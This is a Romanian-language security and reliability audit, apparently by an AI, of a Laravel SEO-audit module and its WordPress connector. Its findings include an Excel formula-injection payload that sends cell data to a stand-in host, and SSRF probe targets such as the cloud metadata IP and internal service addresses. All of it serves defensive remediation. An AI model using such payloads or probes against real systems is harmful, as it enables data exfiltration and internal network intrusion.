# 17 — SEO Audits

**Data:** 2026-07-02 · **Auditor:** Claude (Fable 5) · **Scope:** `app/Services/SeoAudit/*`, Jobs (`RunSeoAudit`, `CrawlSitePages`, `AnalyzeSeoPages`, `CalculateSeoScores`, `FetchKeywordRankings`, `CheckBrokenResources`), `app/Livewire/Seo/*`, `app/Livewire/Sites/Detail/SiteSeoAudit.php`, `SeoAuditDispatcher`, `BrokenResourceDispatcher`, `FixStuckSeoAudits`, modele `Seo*`, `config/seo.php`, endpoint-ul connector `class-seo-endpoint.php`.

---

## Rezumat executiv

1. **Întregul feature „SEO Fix" (push meta/robots/canonical/OG către WP) este mort**: codul trimite header-ul `X-SAM-API-Key`, dar connector-ul acceptă exclusiv HMAC cu `X-SAM-Key`/`X-SAM-Timestamp`/`X-SAM-Signature` (`class-authentication.php:22-32`). Toate apelurile primesc 401. `git log -S "X-SAM-API-Key" -- wordpress-plugin/` nu găsește nimic — header-ul nu a fost acceptat niciodată. La fel eșuează și fetch-ul `/seo/analysis` din `RunSeoAudit` (înghițit în `Log::debug`).
2. **Dacă cineva „repară" auth-ul, `bulkFix()` devine periculos pe site-uri live**: împinge înapoi valorile crawl-ate ca „fix" (titlu gol pentru „Missing title", flip în masă noindex→index, canonical self în masă), fără confirmare, fără audit logging, sincron în request-ul Livewire. Pe fallback-ul fără plugin SEO, connector-ul face `wp_update_post(['post_title' => ...])` — suprascrie titlul postării live cu textul randat al tag-ului `<title>`.
3. **Bugetul de timp al `CrawlSitePages` este matematic imposibil**: timeout 900s, dar 500 pagini + până la 500 verificări de link-uri externe × ~5s + 100 imagini × ~5s pot depăși 3.500s. Timeout → retry (`tries=2`) re-crawlează de la zero și **duplică rândurile `seo_pages`** (nu există unique pe `(seo_audit_id, url_hash)`) → scoruri și issue-uri corupte („Duplicate title" fals pe fiecare pagină). Aceasta e cauza de fond pentru care există `FixStuckSeoAudits` (comitul `b1d83ac` „fix: SEO audit stuck in loop" confirmă istoricul).
4. **Buclă infinită de re-dispatch la eșec**: `next_audit_at` este avansat DOAR la succes (în `CalculateSeoScores`); un audit eșuat lasă monitorul „due", iar dispatcher-ul (la 5 min) creează la nesfârșit audituri noi → site-ul clientului este crawl-at continuu, 24/7, iar coada `performance` este ocupată permanent.
5. **Injecție de formule Excel**: titluri/anchor/alt-text provenite din conținutul site-ului (potențial compromis) sunt scrise cu `setCellValue()`, care interpretează stringurile ce încep cu `=` ca formule — vector de atac asupra staff-ului care deschide raportul.
6. **Gaură de autorizare**: `SiteSeoAudit` verifică doar `authorizeSiteAccess` la mount; toate acțiunile de scriere (runAudit, bulkFix, push-fix-uri, updateSettings, deleteAudit) sunt accesibile rolului Viewer — spre deosebire de `SeoOverview::runAudit`, care corect cere `authorizeSiteModification`.
7. **Zero teste** pentru întregul modul. Eșecurile de audit sunt silențioase (niciun canal de notificare), retenția lasă să crească nelimitat audituri Failed, keyword rankings și site-uri prospect.

---

## Inventar & corectitudine

**Ce face modulul de fapt:**

- **Pipeline audit** (lanț `Bus::chain`, coada `performance`): `RunSeoAudit` (fetch metadate din connector — *nefuncțional*, vezi S-P1-1) → `CrawlSitePages` (crawler BFS same-domain, max 500 pagini implicit / 2000 hard-limit, delay 200ms, parsare DOM: title/meta/H1-H6/imagini/link-uri/canonical/hreflang/JSON-LD, sitemap+robots.txt, verificare link-uri externe și imagini prin HEAD) → `AnalyzeSeoPages` (~23 verificări, generare `seo_issues`) → `CalculateSeoScores` (scor ponderat + diff față de auditul anterior + programarea următorului audit).
- **Dispecerizare:** `SeoAuditDispatcher` la 5 min (`routes/console.php:51`), `BrokenResourceDispatcher` zilnic la 02:00 (`routes/console.php:54`), keyword rankings zilnic la 04:00 (`routes/console.php:57-61`).
- **UI:** `SeoOverview` (portofoliu, scoruri, top issues), `SiteSeoAudit` (793 linii: 8 taburi — issues/pages/links/images/redirects/keywords/infrastructure/history + 5 tipuri de „fix" push + bulk fix + export Excel + setări monitor), `SeoQuickAudit` (audit ad-hoc pentru prospecți — creează `Site` cu `is_prospect=true`).
- **Keyword rankings:** `FetchKeywordRankings` ia top 200 query-uri din **Google Search Console** (`GoogleSearchConsoleService::getTopQueries`, `FetchKeywordRankings.php:54`) pentru o singură zi (acum-3 zile, lag GSC). **Nu este un rank tracker real** — vede doar query-urile pe care site-ul deja apare; gratuit, fără cost API, cotă GSC generoasă (1.200 req/min) — la o rulare/zi/site nu e o problemă.
- **Export Excel:** `ExcelExportService` — 9 sheets (Summary/Issues/Pages/Broken Links/Broken Images/Redirects/Images/Links Map/Infrastructure), generat sincron în request-ul Livewire.

**Cod mort / feature-uri pe jumătate:**

- Toate cele 6 acțiuni push către connector din `SiteSeoAudit` + `bulkFix` + fetch-ul `/seo/analysis` din `RunSeoAudit.php:46` — **nefuncționale** (S-P1-1). Endpoint-urile plugin (`class-seo-endpoint.php:32-95`, inclusiv `update-alt-text` și CRUD `redirects`) există și sunt corecte, dar partea de manager nu le poate apela; `update-alt-text` și `redirects` nici măcar nu au UI.
- `config('seo.crawler.concurrency') = 3` (`config/seo.php:6`) — nefolosit nicăieri; crawler-ul e secvențial.
- `SiteAuditService::startAudit()` creează un `SeoMonitor` inactiv dacă nu există (`SiteAuditService.php:16-19`) — variabila `$monitor` nu mai e folosită apoi.
- `seo_plugin`/`search_visibility`/`redirect_info` în UI (tab Infrastructure) vor fi mereu goale, pentru că singura sursă e fetch-ul connector care dă 401.

**TODO-uri:** niciun `TODO`/`FIXME` în fișierele modulului (verificat prin citire integrală).

---

## Siguranța operațiilor distructive

Modulul e marcat „N" în harta modulelor, dar **conține operații de scriere pe site-uri live**: `pushMetaFix`, `pushRobotsFix`, `pushCanonicalFix`, `pushOgFix`, `toggleSearchVisibility`, `bulkFix` (`SiteSeoAudit.php:456-774`). Astăzi toate eșuează cu 401 (S-P1-1), dar evaluez designul ca și cum ar funcționa, pentru că e o reparație de o linie distanță:

- **Confirmare:** inexistentă. `bulkFix('Page set to noindex')` ar flipa la `index` toate paginile noindex dintr-un click (`SiteSeoAudit.php:491`), iar noindex e frecvent intenționat (thank-you pages, arhive). `bulkFix('Canonical mismatch')` ar suprascrie canonical-ul cu self-canonical pe toate paginile flag-uite (`SiteSeoAudit.php:492`) — canonical-ul diferit e adesea intenționat (paginare, variante).
- **Payload greșit prin design:** pentru `meta`, `bulkFix` trimite `meta_title => $page->title ?? ''` (`SiteSeoAudit.php:490`) — adică exact valoarea crawl-ată care a cauzat issue-ul („Title too short" → retrimite titlul prea scurt; „Missing title" → trimite string gol, pe care connector-ul îl ignoră silențios dar raportează succes). Pe site fără Yoast/RankMath, connector-ul face `wp_update_post(['post_title' => $title])` (`class-seo-endpoint.php:138`) — **suprascrie titlul real al postării** cu stringul complet al tag-ului `<title>` (tipic „Pagina – Nume Site"), corupând conținutul live.
- **Idempotență / locking:** `bulkFix` rulează sincron în request-ul Livewire, cu `usleep(200_000)` între cereri și `Http::timeout(15)` (`SiteSeoAudit.php:508-521`) — la 100+ issue-uri depășește `max_execution_time` PHP-FPM → aplicare parțială fără nicio evidență a ce s-a aplicat. Fără dry-run, fără undo.
- **Audit logging:** fix-urile individuale loghează prin `ActivityLogger` (`SiteSeoAudit.php:627,663,698,739,766`), dar **`bulkFix` nu loghează nimic** — cine-a-schimbat-ce-pe-ce-site e imposibil de reconstituit pentru cel mai periculos entry point.
- **Ștergere:** `deleteAudit` (`SiteSeoAudit.php:776-787`) și `deleteProspect` (`SeoQuickAudit.php:180-203`) șterg date doar din manager (cascade FK OK) — risc scăzut. `deleteProspect` face însă `forceDelete()` pe `Site` fără să șteargă `seo_images` explicit (acoperit de cascade DB) — logica manuală de la `SeoQuickAudit.php:188-194` e redundantă față de FK-urile `ON DELETE CASCADE` (schema: `pgsql-schema.sql:8114-8146`).

---

## Securitate

**Authz pe entry points:**

| Entry point | Protecție | Verdict |
|---|---|---|
| `GET /seo` → `SeoOverview` (`routes/web.php:139`) | grup `auth` + `runAudit` cere `authorizeSiteModification` (`SeoOverview.php:176`) | OK |
| `GET /seo/quick-audit` → `SeoQuickAudit` (`routes/web.php:140`) | doar `auth`; orice user (inclusiv Viewer) poate crea site-uri prospect + declanșa crawl pe **orice URL** (`SeoQuickAudit.php:105-144`) | **slăbiciune** (S-P2-1) |
| `GET /sites/{site}/seo` → `SiteSeoAudit` (`routes/web.php:105`) | `authorizeSiteAccess` doar în `mount()` (`SiteSeoAudit.php:59`); **niciuna** dintre acțiunile de scriere (`runAudit:527`, `bulkFix:456`, `pushMetaFix:609`, `pushRobotsFix:646`, `pushCanonicalFix:681`, `pushOgFix:720`, `toggleSearchVisibility:750`, `updateSettings:554`, `deleteAudit:776`, `trackKeyword:321`, `fetchKeywords:362`) nu verifică `isViewer()` | **S-P1-6** |
| Job-uri (`RunSeoAudit` etc.) | declanșate doar din UI autentificat sau scheduler | OK |

**SSRF (S-P2-1):**

- `SeoQuickAudit::runQuickAudit` validează doar `required|url` (`SeoQuickAudit.php:107`) — acceptă `http://localhost/`, `http://169.254.169.254/`, IP-uri din rețeaua Docker. Crawler-ul fetch-uiește și **stochează title/H1/meta/OG ale țintei**, afișate apoi în UI → oracle de citire a serviciilor HTTP interne pentru orice utilizator autentificat.
- `checkBrokenLinks` (`CrawlSitePages.php:287-295`) și `checkBrokenImages` (`CrawlSitePages.php:572-577`) fac HEAD/GET către **URL-uri arbitrare extrase din conținutul site-ului clientului** (potențial compromis) fără filtrare de IP-uri private — port-scan/probing intern cu status code vizibil în UI/Excel. Idem `fetchSitemap`, care urmează orice `<loc>` din sitemap index (`CrawlSitePages.php:678-692`).
- Mitigant: crawler-ul propriu-zis restrânge la same-domain (`CrawlSitePages.php:113,222`; `UrlNormalizerService::isSameDomain`) și folosește `withoutRedirecting()` (`CrawlSitePages.php:96`) — redirecturile nu sunt urmate cross-domain. Aplicația e internă, utilizatori de agenție → P2, nu P1.

**Injecții:**

- **Excel formula injection (S-P1-5):** `ExcelExportService` scrie valori controlate de site-ul crawl-at cu `setCellValue()` — `$p->title` (`ExcelExportService.php:343`), `$link->anchor_text` (`:407`, `:532`), `$img->alt_text` (`:435`, `:496`), `$p->meta_description` (`:345`). Value binder-ul implicit PhpSpreadsheet tratează stringurile care încep cu `=` ca formule → un site client compromis poate planta `=HYPERLINK(...)`/formule DDE în raportul deschis de staff.
- SQL: query-urile folosesc bindings; `escapeLike` există în `SeoOverview.php:163-166`. `orderByRaw`-urile sunt statice. OK.
- XSS: blade-urile folosesc `{{ }}`; `wire:click="untrackKeyword('{{ $tk->keyword_hash }}')"` cu hash hex e sigur; `addslashes($kw->keyword)` la `site-seo-audit.blade.php:522` e fragil dar keyword-ul vine din GSC/input propriu. OK-ish.

**Mass assignment:** modelele `Seo*` au `$fillable` explicit; inputurile Livewire trec prin cast-uri/clamp (`updateSettings` face clamp pe `max_pages` la hard-limit, `SiteSeoAudit.php:559`). OK.

**Secrete în loguri:** `api_key` nu apare în loguri; erorile logate conțin doar mesaje/URL-uri. `withoutVerifying()` pe toate cererile crawler (`CrawlSitePages.php:95,289,293,574,663,680,719`; `AnalyzeSeoPages.php:549`) + `verify_peer => false` la checkSsl (`AnalyzeSeoPages.php:584`) — acceptă MITM și maschează probleme reale de lanț de certificare (S-P2-6).

**Auth către connector:** vezi S-P1-1 — header greșit, fără HMAC; `WordPressHttpClient` (`app/Services/WordPress/WordPressHttpClient.php:94-100`) face semnarea corect și trebuia folosit.

---

## Igienă queue/job

| Job | tries | timeout | backoff | unique | failed() | Verdict |
|---|---|---|---|---|---|---|
| `RunSeoAudit` | 1 | 60 | — | `seo-audit-{site}`, 900s | markAs Failed + CB | OK |
| `CrawlSitePages` | 2 | **900** | [60,120] | `seo-crawl-{site}`, 1080s | markAs Failed + CB | **buget imposibil** (S-P1-3) |
| `AnalyzeSeoPages` | 2 | 300 | [60] | — | markAs Failed + CB | risc memorie (S-P2-10) |
| `CalculateSeoScores` | 2 | 120 | — | — | markAs Failed + CB | OK |
| `FetchKeywordRankings` | 2 | 120 | — | unique | **lipsă** — dar catch înghite tot (S-P2-5) | eșec invizibil |
| `CheckBrokenResources` | 1 | 600 | — | unique 3600s | **lipsă `failed()`** | contoare denormalizate pot rămâne vechi |

- **Aritmetica timeout-ului (S-P1-3):** cu `default_max_pages=500`, `delay_ms=200`, `timeout_per_page=15` și `max_external_link_checks=500` (`config/seo.php:6-7` — atenție, fallback-ul din cod e 50, dar configul spune **500**; `CrawlSitePages.php:275-276`), worst-case: crawl ~500×(1-15s+0,2s) + 500×(5s+0,1s) + 100×(5s+0,05s) ≫ 900s. Chiar și un site modest cu multe link-uri externe garantează timeout.
- **Retry-ul agravează:** la timeout, atenția 2 re-crawlează de la zero; `SeoPage::create` (`CrawlSitePages.php:118,140,170,232`) nu are constrângere unique pe `(seo_audit_id, url_hash)` (schema are doar indexuri simple, `pgsql-schema.sql:7116-7140`) → **pagini duplicate în același audit** → „Duplicate title/description/content" false pe tot site-ul, contoare umflate.
- **`ShouldBeUnique` + dispatch silențios pierdut (S-P2-8):** dacă lock-ul `seo-crawl-{site}` e ținut (job precedent încă în coadă, sau worker ucis dur la deploy — `horizon:terminate` în mijlocul unui crawl de 15 min lasă lock-ul până la expirarea `uniqueFor`=1080s), `Bus::chain` din `RunSeoAudit.php:69` **nu dispecerizează nimic, fără eroare** → audit blocat în Pending/Crawling. Ăsta e al doilea mecanism care umple `FixStuckSeoAudits`.
- **Coadă Horizon blocată:** auditul rămâne Pending; după 30 min `cleanupStaleAudits` (`SeoAuditDispatcher.php:47-55`) îl marchează Failed. Dacă job-ul totuși rulează ulterior din coada blocată, `markAs(Crawling)` **reînvie un audit deja marcat Failed** — stări zombie posibile (job-ul nu verifică statusul curent înainte de a continua).
- **Bucla de re-dispatch (S-P1-4):** `next_audit_at` e setat exclusiv în `CalculateSeoScores.php:53-65` (la succes). La eșec, monitorul rămâne „due", auditul Failed nu mai blochează `whereDoesntHave('audits', running)` (`SeoAuditDispatcher.php:32-35`) → un nou audit la următorul tick de 5 min, la nesfârșit. Circuit breaker-ul (deschidere după 3 eșecuri consecutive, `CircuitBreakerService.php:13`) NU salvează situația pentru site-urile cu uptime monitor: `CheckUptime` dă `recordSuccess` la fiecare minut când site-ul e up (`CheckUptime.php:75-77`) și resetează `consecutive_failures` — deci bucla rulează nelimitat. Pentru site-urile fără uptime monitor, 3 eșecuri deschid circuitul, iar 3 deschideri în 24h setează `is_monitoring_disabled=true` (`CircuitBreakerService.php:77-80`), care **oprește și backup-urile** (`BackupDispatcher.php:41-42`) — un eșec persistent de crawl SEO poate suprima silențios backup-urile unui site (interacțiune cross-modul, semnalată și pentru `27-queues-scheduler.md`).

---

## Error handling & observabilitate

- **Succesul e vizibil** (ActivityLogger la finalizare, `CalculateSeoScores.php:70`; JobTracker cu procente), dar **eșecul e aproape invizibil**: `failed()` doar marchează auditul și scrie în circuit breaker; nu există **nicio notificare** (comparativ cu `NotifyBackupFailed` la backupuri). Un monitor săptămânal care eșuează în buclă se vede doar dacă cineva deschide pagina site-ului (S-P2-9).
- `RunSeoAudit.php:66-68` — eșecul fetch-ului connector e `Log::debug` (invizibil în producție la nivel implicit); de aceea nimeni nu a observat 401-urile sistematice (S-P1-1).
- `FetchKeywordRankings.php:106-108` — orice excepție e `Log::warning` și job-ul „reușește"; retry-ul (`tries=2`) nu se mai aplică, iar `delete`-ul rândurilor de azi urmat de `insert` fără tranzacție (`:97-103`) poate lăsa ziua fără date la un crash între cele două.
- `FixStuckSeoAudits` (comandă manuală, nu programată — verificat: absentă din `routes/console.php`) este un **plasture explicit**: marchează Failed, resetează `next_audit_at` și **șterge rândurile din `failed_jobs`** (`FixStuckSeoAudits.php:52-68`) — distruge exact dovezile necesare diagnosticării cauzei de fond.
- `scan_duration` e **negativ** sub Carbon 3 (instalat 3.11.1, `composer.lock:3088`): `now()->diffInSeconds($this->audit->created_at)` returnează valoare semnată negativă (`CalculateSeoScores.php:43`) → `gmdate('i:s', negativ)` afișează durate fanteziste în UI (`site-seo-audit.blade.php:83,818`) și Excel (`ExcelExportService.php:93`) (S-P2-2).

---

## Teste

**Ce există azi: nimic.** `grep -rln -i "seoaudit|SeoMonitor|CrawlSitePages|ScoringService" tests/` → zero rezultate. Niciun test unit, feature sau Livewire pentru modul.

**Set minim viabil (în ordinea valorii):**

1. **Test de contract auth connector:** orice apel HTTP din modulul SEO către `wp-json/simplead/*` trebuie să conțină `X-SAM-Key`+`X-SAM-Signature` (Http::fake + assertSent) — ar fi prins S-P1-1 din prima zi.
2. **`CrawlSitePages` cu `Http::fake`:** respectă `max_pages`, nu părăsește domeniul (SSRF guard), nu creează duplicate la re-rulare pe același audit (prinde S-P1-3/duplicate).
3. **Dispatcher după eșec:** un audit Failed cu monitor `next_audit_at <= now` NU trebuie re-dispecerizat imediat la infinit (prinde S-P1-4; azi testul ar pica — corect).
4. **`ScoringService` unit:** penalizările nu scad sub 0 și nu explodează liniar cu numărul de pagini pentru același tip de issue (documentează comportamentul actual/dorit, S-P2-3).
5. **Livewire authz:** user cu rol Viewer primește 403 pe `bulkFix`/`pushMetaFix`/`deleteAudit` (prinde S-P1-6; azi ar pica — corect).
6. **`ExcelExportService`:** o pagină cu titlu `=HYPERLINK("http://evil","x")` produce celulă text, nu formulă (prinde S-P1-5).
7. **`AnalyzeSeoPages` smoke:** set fix de `SeoPage` → issue-urile așteptate + count-urile grupate corecte pe audit.

---

## Model de date

- **Cascade:** FK-uri `ON DELETE CASCADE` complete (`seo_pages/links/images/issues → seo_audits`, `seo_* → sites`; `pgsql-schema.sql:8038-8146`) — ștergerea unui audit e curată. OK.
- **Indexuri:** query-urile fierbinți sunt acoperite (`seo_pages(seo_audit_id,status_code)`, `seo_links(seo_audit_id,type,is_broken)`, `seo_monitors(is_active,next_audit_at)`, `seo_keyword_rankings(site_id,keyword_hash,recorded_date)`; `pgsql-schema.sql:7011-7140`). **Lipsește** unique pe `seo_pages(seo_audit_id,url_hash)` — permite duplicatele din S-P1-3.
- **N+1 / memorie:** `SeoOverview` face eager loading corect (`SeoOverview.php:38-40`). `AnalyzeSeoPages.php:49` încarcă TOATE paginile cu tot cu `meta` jsonb care conține `structured_data_raw` — JSON-LD-ul complet al fiecărei pagini (`CrawlSitePages.php:205`) — la 2000 de pagini poate însemna sute de MB (S-P2-10). Blade-ul apelează `$this->keywordRankings->paginate(50)` de două ori (`site-seo-audit.blade.php:506,537`) — query dublu (P3).
- **Soft-delete:** `Site` e soft-deleted; dispatcher-ele filtrează `deleted_at` corect. FK-ul cascade șterge datele SEO doar la `forceDelete` — pentru site-uri soft-deleted datele rămân (acceptabil, dar nimeni nu le curăță).
- **Retenție & orfani (S-P2-4):** `RetentionPolicyService.php:103-111` șterge doar `seo_audits` cu `status='completed'` (90 zile implicit) → **auditurile Failed se acumulează pentru totdeauna** (și, cu bucla S-P1-4, pot fi sute/site). `seo_keyword_rankings` nu are nicio politică (200 rânduri/zi/site ≈ 73k/an/site). Site-urile prospect din Quick Audit se creează la fiecare rulare fără dedup (`SeoQuickAudit.php:119-124`) și se șterg doar manual.
- `latestSeoAudit = hasOne()->latestOfMany('scanned_at')` (`HasSiteRelationships.php:330-333`) — corect ignoră auditurile ne-completate (scanned_at NULL).

---

## Constatări

| ID | Sev | Fișiere:linii | Descriere | Scenariu de eșec | Remediere (schiță) |
|---|---|---|---|---|---|
| S-P1-1 | P1 | `app/Jobs/RunSeoAudit.php:46`; `app/Livewire/Sites/Detail/SiteSeoAudit.php:509,619,656,691,730,760`; `wordpress-plugin/.../class-authentication.php:22-32` | Toate apelurile SEO către connector folosesc header inexistent `X-SAM-API-Key`, fără HMAC — connector-ul cere `X-SAM-Key`+`Timestamp`+`Signature`. Feature-ul „SEO Fix" și fetch-ul `/seo/analysis` sunt 100% nefuncționale (401), erorile fiind înghițite. | Operatorul apasă „Fix" pe un issue → „Failed: …" mereu; `seo_plugin`/`search_visibility` mereu goale; nimeni nu știe de când. | Rutați toate apelurile prin `WordPressHttpClient` (semnare HMAC existentă) în loc de `Http::` direct. |
| S-P1-2 | P1 | `app/Livewire/Sites/Detail/SiteSeoAudit.php:456-525` (payload :489-495); `class-seo-endpoint.php:135-141` | `bulkFix` împinge valorile crawl-ate ca „fix" (titlu gol / titlul randat al tag-ului `<title>` → `wp_update_post(post_title)` pe fallback), flip noindex→index și canonical-self în masă — fără confirmare, fără ActivityLogger, sincron în request Livewire (N×15s → timeout FPM, aplicare parțială). Latent azi doar pentru că S-P1-1 blochează totul. | După repararea auth-ului: un click pe „Bulk fix — Page set to noindex" scoate noindex-ul de pe toate paginile intenționat ascunse ale clientului; pe site fără Yoast, titlurile postărilor sunt suprascrise cu „Pagina – Nume Site". | Re-proiectare: job queue-uit, preview + confirmare per-URL, valori noi explicite (nu cele crawl-ate), logging per aplicare. |
| S-P1-3 | P1 | `app/Jobs/CrawlSitePages.php:31-37,81,272-306,561-599`; `config/seo.php:6-7`; `pgsql-schema.sql:7116-7140` | Bugetul de timp e imposibil (crawl 500 pagini + până la 500 verificări link-uri ×5s + 100 imagini ×5s ≫ timeout 900s); la retry (`tries=2`) re-crawlează de la zero și duplică `seo_pages` (fără unique `(seo_audit_id,url_hash)`), corupând issue-urile și scorurile. Cauza de fond a auditurilor „stuck" (cf. commit `b1d83ac` și existența `FixStuckSeoAudits`). | Site cu 300 pagini și multe link-uri externe: attempt 1 timeout la pagina ~200, attempt 2 recrează 200 pagini duplicate apoi timeout/finalizează → audit Completed cu „Duplicate title" pe tot site-ul și scor prăbușit. | Mutați verificarea link-urilor/imaginilor în job separat (există deja `CheckBrokenResources`), reduceți `max_external_link_checks`, checkpoint/resume pe retry sau `upsert` pe `(seo_audit_id,url_hash)` + constrângere unique. |
| S-P1-4 | P1 | `app/Dispatchers/SeoAuditDispatcher.php:21-44`; `app/Jobs/CalculateSeoScores.php:53-65`; `app/Jobs/CrawlSitePages.php:265-270`; `app/Jobs/CheckUptime.php:75-77` | `next_audit_at` avansează doar la succes; auditurile eșuate lasă monitorul „due" → re-dispatch la fiecare 5 min, la nesfârșit. Circuit breaker-ul e neutralizat de `recordSuccess` din uptime (la fiecare minut), iar pe site-urile fără uptime monitor 3 deschideri/24h setează `is_monitoring_disabled` care oprește și backup-urile (`BackupDispatcher.php:41-42`). | Site al cărui crawl eșuează mereu (WAF blochează UA `SimpleAd-SEO/1.0` sau S-P1-3): crawl continuu 24/7 pe site-ul live (5 req/s, ~15-30 min/ciclu) + coada `performance` ocupată permanent; alternativ, backup-urile site-ului se opresc silențios. | Setați `next_audit_at` (cu backoff exponențial) și în `failed()`-urile lanțului; decuplați `is_monitoring_disabled` de eșecurile SEO. |
| S-P1-5 | P1 | `app/Services/SeoAudit/ExcelExportService.php:343,345,407,435,496,532` | Injecție de formule Excel: title/meta/anchor/alt provenite din conținutul site-ului crawl-at sunt scrise cu `setCellValue()`, iar value binder-ul implicit PhpSpreadsheet tratează `=`-prefix ca formulă. | Site client compromis servește `<title>=HYPERLINK("http://evil.tld/x?"&A1,"click")</title>`; staff-ul exportă auditul și deschide xlsx → formula se execută în Excel. | `StringValueBinder` global la export sau `setCellValueExplicit(..., TYPE_STRING)` pentru toate câmpurile provenite din crawl. |
| S-P1-6 | P1 | `app/Livewire/Sites/Detail/SiteSeoAudit.php:57-61,456,527,554,609,646,681,720,750,776`; comparativ `app/Livewire/Seo/SeoOverview.php:176` | `SiteSeoAudit` verifică doar `authorizeSiteAccess` (mount); acțiunile de scriere — inclusiv push-uri către site-ul WP live și `deleteAudit` — nu verifică rolul Viewer, deși trait-ul `authorizeSiteModification` există și e folosit în `SeoOverview`. | Un utilizator Viewer deschide pagina SEO a unui site și apelează `pushRobotsFix`/`deleteAudit` (acțiuni Livewire invocabile direct) → modificări pe site-ul live / ștergere de istoric, contrar modelului de roluri. | Apelați `authorizeSiteModification($this->site)` în toate acțiunile mutante. |
| S-P2-1 | P2 | `SeoQuickAudit.php:107,119-124`; `CrawlSitePages.php:287-295,572-577,678-692` | SSRF/probing: Quick Audit acceptă orice URL (inclusiv IP-uri interne/metadata) și stochează title/H1/meta; verificările de link-uri/imagini/sitemap fac cereri către URL-uri arbitrare din conținutul clientului, fără filtrare de IP privat. | User autentificat rulează quick audit pe `http://172.18.0.5:8080/` și citește titlurile serviciului intern; pagină client compromisă cu `<a href="http://10.0.0.1:6379/">` → probing intern cu status vizibil. | Validare URL: rezolvare DNS + respingere IP-uri private/link-local înainte de fetch (guard comun pentru crawler și checkers). |
| S-P2-2 | P2 | `CalculateSeoScores.php:43`; `site-seo-audit.blade.php:83,818`; `ExcelExportService.php:93` | Carbon 3 (3.11.1) returnează diff semnat: `now()->diffInSeconds($created_at)` e negativ → `scan_duration` negativ → `gmdate()` afișează durate aberante. | Fiecare audit finalizat afișează durată de tip „59:47" indiferent de realitate. | `(int) $this->audit->created_at->diffInSeconds(now())` sau `abs()`. |
| S-P2-3 | P2 | `ScoringService.php:13-17`; `AnalyzeSeoPages.php:641-646`; `config/seo.php:8` | Scorurile penalizează per-înregistrare (per pagină), nu per tip de issue — comentariul din `persistIssues` arată că doar count-urile au fost de-duplicate, nu și scoringul. 12+ pagini fără meta description (High=8) → `on_page`=0. Ponderile (40/30/20/10) sunt rezonabile, dar penalizarea liniară face scorul necomparabil între site-uri de mărimi diferite. | Site sănătos cu 200 pagini și un singur tip de issue Medium pe toate → categoria 0/100; site cu 5 pagini și aceleași probleme → 85/100. | Penalizați pe grupuri (title+severity) sau cu plafon per tip, aliniat cu logica din `persistIssues`. |
| S-P2-4 | P2 | `RetentionPolicyService.php:103-111`; `FetchKeywordRankings.php:80-103`; `SeoQuickAudit.php:119-124`; `CrawlSitePages.php:205` | Retenție incompletă: auditurile Failed nu sunt șterse niciodată (condiția `status='completed'`), `seo_keyword_rankings` fără politică (~73k rânduri/an/site), site-urile prospect se acumulează fără dedup, `structured_data_raw` (JSON-LD complet) stocat per pagină umflă `seo_pages.meta`. | Cu bucla S-P1-4, un site problematic generează sute de audituri Failed pe lună; DB crește nelimitat. | Extindeți retenția la audituri failed + rankings + prospecți; nu persistați `structured_data_raw` (doar rezultatul validării). |
| S-P2-5 | P2 | `FetchKeywordRankings.php:52-108` | Catch-all înghite orice eroare (job „reușește", retry inutil); delete-then-insert fără tranzacție poate pierde datele zilei; sursa e GSC (lag 3 zile, doar query-uri existente) — nu e rank-tracking pentru keyword-uri țintă noi. | Token Google expirat → luni întregi fără rankings, zero alerte; crash între delete și insert → gaură în istoric. | Lăsați excepția să propage (failed() + notificare), împachetați în `DB::transaction`. |
| S-P2-6 | P2 | `CrawlSitePages.php:95,289,293,574,663,680,719`; `AnalyzeSeoPages.php:549,584` | `withoutVerifying()` pe toate cererile + `verify_peer=false` la SSL check — crawler-ul acceptă MITM și nu detectează lanțuri de certificare invalide (raportează doar expirarea). | Site client cu certificat self-signed/lanț rupt → auditul spune „SSL valid" dacă data e în viitor. | Verificare TLS activă implicit, cu opt-out per site; la checkSsl folosiți `verify_peer=true` și raportați eroarea de verificare ca issue. |
| S-P2-7 | P2 | `AnalyzeSeoPages.php:552-563` | Verificarea headerelor de securitate e case-sensitive (`isset($headers['Strict-Transport-Security'])`) — serverele care emit headere lowercase (HTTP/2, unele CDN-uri) produc false „Missing HSTS/CSP". | Site cu HSTS corect servit lowercase → issue Medium fals în fiecare audit + penalizare de scor. | Normalizați cheile la lowercase înainte de verificare. |
| S-P2-8 | P2 | `RunSeoAudit.php:22,30,69`; `CrawlSitePages.php:27,35`; `SeoAuditDispatcher.php:47-55`; `FixStuckSeoAudits.php` | `ShouldBeUnique` face dispatch-ul lanțului să fie **pierdut silențios** când lock-ul e ținut (job în coadă sau worker ucis dur la deploy — lock persistă până la `uniqueFor`); auditul rămâne Pending → plasturii `cleanupStaleAudits`/`FixStuckSeoAudits` (care în plus șterge `failed_jobs`, distrugând forensics: `FixStuckSeoAudits.php:60-66`). | Deploy cu `horizon:terminate` în mijlocul unui crawl → următorul audit manual „pornit" nu face nimic; user-ul vede Pending 30 min apoi Failed fără explicație. | La dispatch, verificați explicit lock-ul și raportați; marcați auditul Failed imediat dacă dispatch-ul e refuzat; nu ștergeți failed_jobs în comanda de fix. |
| S-P2-9 | P2 | `CrawlSitePages.php:265-270`; `AnalyzeSeoPages.php:87-92`; `CalculateSeoScores.php:74-79` | Zero alerting la eșec: `failed()` doar marchează auditul; nu există integrare cu `NotificationService`/`ActivityLogger` pe ramura de eșec (ActivityLogger e apelat doar la succes, `CalculateSeoScores.php:70`). | Monitorul săptămânal al unui client eșuează 3 luni la rând; nimeni nu află până când clientul cere raportul SEO. | Notificare (canal existent) la primul eșec + la N eșecuri consecutive pe monitor. |
| S-P2-10 | P2 | `AnalyzeSeoPages.php:49`; `CrawlSitePages.php:201-206,676-693`; `SiteSeoAudit.php:564-576`; `ExcelExportService.php:38-64` | Riscuri de memorie/timp: `pages()->get()` încarcă tot (inclusiv `structured_data_raw`); fetch-ul sitemap index e nelimitat (număr de sub-sitemaps/URL-uri); exportul Excel (9 sheets, autosize, până la 2000 pagini + 5000 links + 5000 images) rulează sincron în request-ul Livewire. | Site cu sitemap index de 200 sub-sitemaps sau audit de 2000 pagini → OOM pe worker / request de export de zeci de secunde. | Chunking pe pagini în analiză, limită la sub-sitemaps, export queue-uit cu link de download. |
| S-P2-11 | P2 | `pgsql-schema.sql:7116-7140`; `CrawlSitePages.php:118,170` | Lipsă constrângere unique `(seo_audit_id, url_hash)` pe `seo_pages` — nimic nu împiedică duplicatele (vector: S-P1-3, dar și orice dublă execuție). | Vezi S-P1-3. | Migrare: unique index + `upsert` în crawler. |
